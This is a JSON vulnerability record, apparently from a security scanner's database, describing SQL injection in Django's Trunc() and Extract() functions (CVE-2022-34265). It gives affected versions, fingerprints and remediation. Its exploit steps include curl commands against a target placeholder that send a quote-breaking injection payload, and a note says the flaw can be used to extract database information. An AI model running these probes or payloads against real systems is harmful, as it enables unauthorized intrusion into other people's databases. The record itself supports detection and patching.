{
  "vuln_id": "django_cve2022_34265",
  "description": "Django框架中Trunc()和Extract()数据库函数存在SQL注入漏洞",
  "category": "sql_injection",
  "cves": [
    "CVE-2022-34265"
  ],
  "match_keywords": [
    "django",
    "CVE-2022-34265",
    "Trunc",
    "Extract",
    "SQL injection"
  ],
  "fingerprint_keywords": [
    "Django",
    "django/4.0.5",
    "django/3.2.13"
  ],
  "affected_versions": "Django < 4.0.6, < 3.2.14",
  "default_port": 8000,
  "common_endpoints": [
    "/"
  ],
  "detection_method": "发送GET请求到目标URL，参数date包含SQL注入payload（如xxxx'xxxx），如果返回SQL错误信息则存在漏洞",
  "exploit_steps": [
    {
      "step": 1,
      "description": "访问目标网站，确认存在漏洞参数",
      "command": "curl -s 'http://{TARGET}:8000/?date=minute'",
      "expected_result": "返回正常的页面内容，显示每分钟点击次数",
      "notes": "确认目标使用Trunc函数处理date参数"
    },
    {
      "step": 2,
      "description": "发送SQL注入payload触发错误",
      "command": "curl -s 'http://{TARGET}:8000/?date=xxxx\\'xxxx'",
      "expected_result": "返回SQL错误信息，如语法错误或数据库错误",
      "notes": "使用单引号闭合SQL语句触发注入"
    }
  ],
  "verification_command": "curl -s \"http://{TARGET}:8000/?date=xxxx%27xxxx\"",
  "verification_success_sign": "响应中包含SQL错误信息或数据库错误提示",
  "requires_callback": false,
  "callback_note": "此漏洞为SQL注入，不需要目标回连攻击机。可通过SQL注入获取数据库信息或执行进一步操作",
  "remediation": "升级Django到4.0.6或3.2.14及以上版本",
  "tags": [
    "django",
    "sql-injection",
    "web",
    "python"
  ],
